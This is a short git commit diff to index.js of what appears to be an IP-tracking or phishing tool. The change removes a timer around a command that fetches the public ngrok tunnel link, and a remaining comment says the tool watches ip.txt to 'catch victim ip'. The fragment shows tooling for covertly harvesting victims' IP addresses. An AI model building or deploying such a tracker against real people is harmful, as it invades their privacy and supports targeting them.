895da08932b6455ed45add3bed0b4f28b8322cf5
Fajar Firdaus <35714197+FajarTheGGman@users.noreply.github.com>
2020-05-25 21:43:09 +0700

    Update index.js

--- index.js
+++ index.js
@@ -68,12 +68,9 @@ ask.prompt({
 
 function tracking(){
 
-setInterval(() => {
 
-
-    
 console.log(warna.bgBlue("[Link] : ") + warna2.rainbow(s.exec("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'")))
-}, 3000)
+
 
 // Watch ip.txt file for catch victim ip
 fs.watchFile("./output/ip.txt", (current, previous) => {
